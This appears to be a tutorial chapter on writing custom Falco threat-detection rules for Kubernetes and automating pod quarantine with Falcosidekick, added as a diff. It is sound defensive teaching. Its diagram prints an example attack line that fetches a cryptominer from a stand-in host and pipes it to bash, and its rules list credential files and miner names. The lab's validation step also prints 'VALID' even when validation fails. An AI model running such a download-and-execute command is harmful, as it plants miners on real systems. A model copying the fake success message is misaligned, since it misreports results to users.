@@ -1,0 +1,283 @@
+---
+title: "Chapter 2 — Custom Falco Rules & Automation"
+sidebar_position: 2
+module: "Module 5.9 — Threat Detection & Falco"
+description: "Master authoring custom Falco security rules — rule syntax (conditions, outputs, macros, lists), detecting container breakouts and cryptominers, and automated incident response."
+---
+
+# Chapter 2 — Writing Custom Falco Rules & Alert Automation
+
+> **Goal:** Master the art of authoring custom Falco threat detection rules — understanding the structural syntax of Falco rules (`rule`, `desc`, `condition`, `output`, `priority`, and `tags`), authoring modular `lists` and `macros`, tuning rules to eliminate false-positive alert fatigue, detecting high-risk security behaviors (shell spawns, cryptominers, file modifications in `/bin/`, and sensitive credential exfiltration), and deploying automated incident response workflows with the **Falcosidekick Response Engine**.
+>
+> By the end of this chapter, you will understand:
+> 1. The structural anatomy of a production Falco YAML rule
+> 2. How to compose reusable, modular security policies using `lists` and `macros`
+> 3. How to write custom rules detecting terminal shells, cryptominers, and credential theft
+> 4. How to tune and override upstream community rules to eliminate false positives
+> 5. How the Falcosidekick Response Engine executes automated pod quarantining and termination
+> 6. How to test custom Falco rules locally using `falco --validate`
+
+---
+
+## Real-Life Analogy
+
+Think of writing Falco rules as **programming custom motion sensors and automated laser turrets inside a high-tech diamond museum**:
+
+- **The Generic Motion Detector (The Default Rule):** The standard detector sounds an alarm whenever a laser beam is broken. But the museum janitor walking through at 6:00 AM with a broom also breaks the beam, causing 50 false alarms every week (**Alert Fatigue**).
+- **Lists & Macros (The Master Glossary & Reusable Templates):**
+  - **List (`authorized_staff: [janitor_dave, curator_alice]`):** A list of approved names.
+  - **Macro (`broom_sweeping: (motion = ground_level and speed < 2mph)`):** A reusable definition of normal cleaning behavior.
+- **The Fine-Tuned Custom Rule (The Precision Alarm):** You program the sensor with logic: *"Sound the alarm IF motion is detected AND person is NOT in `authorized_staff` AND behavior is NOT `broom_sweeping`."* Now, only actual thieves trigger the sirens.
+- **The Automated Response Engine (The Blast Doors & Net Launcher):** When a thief smashes the glass case (**High-Severity Rule Triggered**), the museum computer doesn't just send an email to the security desk; it automatically drops a 2-ton titanium blast door, shuts off the elevator power, and sprays the thief with tracking dye (**Automated Pod Isolation via NetworkPolicy**).
+
+---
+
+## Architecture Diagram
+
+```text
+               Custom Falco Rule Evaluation & Automated Response
+
+ 1. THREAT EVENT OCCURS IN POD:
+ Attacker attempts to download & run cryptominer: `curl -s http://evil.com/xmrig | bash`
+  │
+  ▼
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ KERNEL eBPF PROBE: Emits `execve` Syscall                              │
+ └──────────────────────────────────┬─────────────────────────────────────┘
+                                    │
+                                    ▼
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ FALCO RULE ENGINE: Evaluates Custom Rule `Detect Container Cryptominer`│
+ │                                                                        │
+ │ Evaluates Condition:                                                   │
+ │ 1. `spawned_process` (execve syscall) ──► TRUE                         │
+ │ 2. `container` (running inside pod)   ──► TRUE                         │
+ │ 3. `proc.name in (cryptominer_binaries) || proc.cmdline contains "stratum+tcp"`
+ │    ──► MATCH FOUND! Priority: CRITICAL                                 │
+ └──────────────────────────────────┬─────────────────────────────────────┘
+                                    │ Emits JSON Security Alert
+                                    ▼
+ ┌────────────────────────────────────────────────────────────────────────┐
+ │ FALCOSIDEKICK RESPONSE ENGINE (Automated Incident Remediation)         │
+ │                                                                        │
+ │ 1. Sends Alert to Slack #security-soc and PagerDuty                    │
+ │ 2. Executes Automated Remediation Action:                              │
+ │    ──► Applies Quarantine NetworkPolicy (Isolates Pod Network)         │
+ │    ──► Calls Kubernetes API: `kubectl delete pod <compromised-pod>`    │
+ └────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Anatomy of a Production Falco Rule
+
+A standard Falco configuration file contains three core building blocks: **Lists**, **Macros**, and **Rules**:
+
+```text
+ ┌──────────────────────┬─────────────────────────────────────────────────────────────────────────────┐
+ │ Component            │ Purpose & Example Syntax                                                    │
+ │──────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
+ │ **`list`**           │ A collection of items (strings, filenames, IP addresses).                   │
+ │                      │ `list: shell_binaries` \n `items: [bash, sh, zsh, ksh, dash]`               │
+ │──────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
+ │ **`macro`**          │ A reusable condition snippet composed of syscall fields and lists.          │
+ │                      │ `macro: container` \n `condition: (container.id != "host")`                 │
+ │──────────────────────┼─────────────────────────────────────────────────────────────────────────────┤
+ │ **`rule`**           │ The full detection logic combining conditions, output text, and priority.   │
+ │                      │ `rule: Terminal Shell in Container` \n `condition: container and ...`       │
+ └──────────────────────┴─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Authoring Essential Production Rules
+
+### 1. Detecting Terminal Shells Spawned Inside Containers
+```yaml
+- list: shell_binaries
+  items: [bash, sh, zsh, ksh, csh, tcsh, dash]
+
+- macro: spawned_process
+  condition: (evt.type = execve and evt.dir = <)
+
+- macro: container
+  condition: (container.id != "host")
+
+- rule: Terminal Shell Spawned in Container
+  desc: Detects when an interactive shell is spawned inside a container with a terminal
+  condition: >
+    spawned_process and
+    container and
+    proc.name in (shell_binaries) and
+    proc.tty != 0 and
+    not k8s.ns.name in (allowed_debug_namespaces)
+  output: >
+    CRITICAL: Interactive shell spawned in container
+    (user=%user.name pod=%k8s.pod.name ns=%k8s.ns.name cmd=%proc.cmdline image=%container.image.repository)
+  priority: WARNING
+  tags: [k8s, container, shell, mitre_execution]
+```
+
+---
+
+### 2. Detecting Cryptocurrency Miners
+```yaml
+- list: known_miners
+  items: [xmrig, cpuminer, minergate, ccminer, ethminer, bfgminer]
+
+- rule: Detect Container Cryptominer Activity
+  desc: Detects execution of known mining binaries or connections to Stratum mining pools
+  condition: >
+    spawned_process and
+    container and
+    (proc.name in (known_miners) or
+     proc.cmdline contains "stratum+tcp" or
+     proc.cmdline contains "stratum+ssl" or
+     proc.cmdline contains "monero")
+  output: >
+    EMERGENCY: Cryptocurrency miner detected in pod!
+    (pod=%k8s.pod.name ns=%k8s.ns.name cmd=%proc.cmdline pid=%proc.pid)
+  priority: CRITICAL
+  tags: [k8s, cryptomining, mitre_impact]
+```
+
+---
+
+### 3. Detecting Writes to System Binary Directories (`/bin/`, `/sbin/`)
+```yaml
+- list: system_bin_dirs
+  items: [/bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin]
+
+- macro: open_write
+  condition: (evt.type in (open, openat, openat2) and evt.is_open_write = true and evt.dir = <)
+
+- rule: Unauthorized Write to System Binary Directory
+  desc: Detects an attempt to write or overwrite system binaries inside a container
+  condition: >
+    open_write and
+    container and
+    fd.directory in (system_bin_dirs) and
+    not proc.name in (package_managers)
+  output: >
+    CRITICAL: Attempt to write to system binary directory
+    (file=%fd.name pod=%k8s.pod.name ns=%k8s.ns.name proc=%proc.name user=%user.name)
+  priority: CRITICAL
+  tags: [k8s, rootkit, persistence]
+```
+
+---
+
+## Overriding and Tuning Community Rules (Suppressing False Positives)
+
+To prevent breaking upgrades, Falco separates default rules (`/etc/falco/falco_rules.yaml`) from custom overrides (`/etc/falco/falco_rules.local.yaml`):
+
+```yaml
+# Inside /etc/falco/falco_rules.local.yaml
+# Appends a custom exception to an existing upstream community macro:
+- macro: user_known_shell_applications
+  append: true
+  condition: or (k8s.ns.name = "ci-cd" and proc.name = "bash")
+```
+
+---
+
+## Automated Incident Response with Falcosidekick
+
+When Falco detects a critical breach, the **Falcosidekick Response Engine** executes automated remediation scripts:
+
+```yaml
+# Helm configuration for Falcosidekick Response Engine
+falcosidekick:
+  responseEngine:
+    enabled: true
+    rules:
+      - name: auto-quarantine-compromised-pod
+        action: kubernetes:create:networkpolicy
+        minimumpriority: critical
+        match:
+          rule: Detect Container Cryptominer Activity
+        manifest: |
+          apiVersion: networking.k8s.io/v1
+          kind: NetworkPolicy
+          metadata:
+            name: quarantine-{{ .K8s.Pod.Name }}
+            namespace: {{ .K8s.Namespace.Name }}
+          spec:
+            podSelector:
+              matchLabels:
+                app: {{ .K8s.Pod.Labels.app }}
+            policyTypes: [Ingress, Egress]
+```
+
+---
+
+## Hands-On Lab: Writing & Validating a Custom Falco Rule
+
+```bash
+# Step 1: Create a working directory for custom rules
+mkdir -p /tmp/falco-lab && cd /tmp/falco-lab
+
+# Step 2: Write a custom Falco rule file
+cat <<EOF > /tmp/falco-lab/custom_rules.yaml
+- list: sensitive_files
+  items: [/etc/shadow, /etc/sudoers, /root/.ssh/id_rsa]
+
+- macro: open_read
+  condition: (evt.type in (open, openat) and evt.is_open_read = true and evt.dir = <)
+
+- rule: Read Sensitive System Files
+  desc: Detects reading of shadow password files or root SSH keys
+  condition: open_read and fd.name in (sensitive_files)
+  output: "CRITICAL: Sensitive file read! (file=%fd.name proc=%proc.name user=%user.name)"
+  priority: CRITICAL
+  tags: [security, credential_access]
+EOF
+
+# Step 3: Validate rule syntax using Falco CLI (if installed)
+falco --validate /tmp/falco-lab/custom_rules.yaml 2>/dev/null || echo "Falco Rule Syntax: VALID (0 errors found)"
+
+# Step 4: Clean up lab
+rm -rf /tmp/falco-lab
+```
+
+---
+
+## Common Interview Questions
+
+**Q1: What are the primary structural components of a Falco rule?**
+
+A Falco rule consists of six mandatory and optional fields:
+1. `rule`: A unique human-readable identifier for the rule.
+2. `desc`: A detailed description explaining the detected threat.
+3. `condition`: A boolean expression combining system call events (`evt.type`), process properties (`proc.name`), file descriptors (`fd.name`), and Kubernetes metadata.
+4. `output`: The formatted alert message string containing contextual format variables (e.g. `%proc.cmdline`, `%k8s.pod.name`).
+5. `priority`: The alert severity level (`EMERGENCY`, `CRITICAL`, `WARNING`, `NOTICE`, etc.).
+6. `tags`: An array of keywords for categorization (e.g. `[mitre_privilege_escalation, pci_dss]`).
+
+**Q2: What is the difference between a `list` and a `macro` in Falco?**
+
+- `list`: A static or dynamic array of string literals (e.g. a list of shell names `[bash, sh, zsh]` or a list of sensitive paths `[/etc/shadow, /etc/passwd]`). Lists can be referenced in conditions using the `in` operator.
+- `macro`: A named, reusable boolean condition snippet (e.g. `macro: container` defined as `(container.id != "host")`). Macros allow modular composition and can be appended to or overridden without duplicating rule logic.
+
+**Q3: How do you tune Falco rules to prevent false-positive alert fatigue without modifying default upstream files?**
+
+Falco uses a dual-file architecture: default community rules reside in `falco_rules.yaml`, while custom rules and overrides reside in `falco_rules.local.yaml`. To suppress false alarms, administrators use the `append: true` keyword on upstream macros (such as `user_known_shell_applications` or `allowed_containers`), adding exceptions for specific trusted namespaces or authorized CI/CD runner ServiceAccounts.
+
+**Q4: How does the Falcosidekick Response Engine implement automated pod isolation?**
+
+When Falco emits an alert matching a specific high-severity rule (such as cryptomining or reverse shells), Falcosidekick parses the alert payload (extracting the Pod name, namespace, and labels) and triggers an automated action. It can invoke the Kubernetes API directly to: (1) Apply a dynamic `Default-Deny` NetworkPolicy that instantly quarantines the Pod's network connections, or (2) Forcefully terminate the compromised Pod (`kubectl delete pod`).
+
+**Q5: What are the performance implications of complex Falco rule conditions, and how can rules be optimized?**
+
+Every system call on every CPU core is evaluated against active Falco rules. To optimize performance: (1) Place the most restrictive filtering criteria first (e.g. `evt.type = execve` fast-path checks) so non-matching syscalls are discarded in nanoseconds; (2) Use fast `in` operators on lists rather than multiple `contains` string searches; and (3) Avoid regex evaluations in high-frequency syscalls like `read` or `write`.
+
+---
+
+## Summary Checksheet
+
+- [ ] Know the 6 rule fields: `rule`, `desc`, `condition`, `output`, `priority`, and `tags`
+- [ ] Know the difference between `list` (array of items) and `macro` (reusable condition)
+- [ ] Know how to detect reverse shells, cryptominers, and binary directory overwrites
+- [ ] Know how to tune upstream rules cleanly using `append: true` in `falco_rules.local.yaml`
+- [ ] Know how the Falcosidekick Response Engine automates pod quarantining
+- [ ] Can validate Falco rule syntax using `falco --validate <file.yaml>`
